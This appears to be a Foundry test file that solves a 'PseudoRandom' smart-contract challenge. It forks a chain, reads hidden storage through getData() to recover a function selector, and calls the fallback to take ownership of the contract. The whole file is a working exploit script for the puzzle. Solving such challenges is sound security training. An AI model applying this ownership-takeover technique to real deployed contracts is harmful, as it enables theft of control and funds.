// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "forge-std/Test.sol";
import "../PseudoRandom.sol";

contract PseudoRandomTest is Test {
    string private BSC_RPC = "https://rpc.ankr.com/bsc"; // 56
    string private POLY_RPC = "https://rpc.ankr.com/polygon"; // 137
    string private FANTOM_RPC = "https://rpc.ankr.com/fantom"; // 250
    string private ARB_RPC = "https://rpc.ankr.com/arbitrum"; // 42161
    string private OPT_RPC = "https://rpc.ankr.com/optimism"; // 10
    string private GNOSIS_RPC = "https://rpc.ankr.com/gnosis"; // 100

    address private addr;

    function setUp() external {
        vm.createSelectFork(BSC_RPC);
    }

    function test() external {
        string memory rpc = new string(32);
        assembly {
            // network selection
            let _rpc := sload(
                add(mod(xor(number(), timestamp()), 0x06), BSC_RPC.slot)
            )
            mstore(rpc, shr(0x01, and(_rpc, 0xff)))
            mstore(add(rpc, 0x20), and(_rpc, not(0xff)))
        }

        addr = makeAddr(rpc);

        vm.createSelectFork(rpc);

        vm.startPrank(addr, addr);

        address instance = address(new PseudoRandom());

        // Calling getData() in order to obtain storage slot containing proper func sig
        // sload(add(chainid(), caller()))
        bytes memory slotData = abi.encodePacked(
            bytes4(0x3bc5de30),
            abi.encode(block.chainid + uint256(uint160(addr)))
        );

        (, bytes memory retSlotData) = instance.call(slotData);

        // Calling getData() again in order to obtain func sig - sload(sload(add(chainid(), caller())))
        bytes memory sigData = abi.encodePacked(
            bytes4(0x3bc5de30),
            retSlotData
        );

        (, bytes memory retSigData) = instance.call(sigData);

        // Calling fallback() func with proper function signature
        bytes memory finalData = abi.encodePacked(
            bytes4(retSigData),
            new bytes(32),
            abi.encode(addr)
        );

        instance.call(finalData);

        assertEq(PseudoRandom(instance).owner(), addr);
    }
}
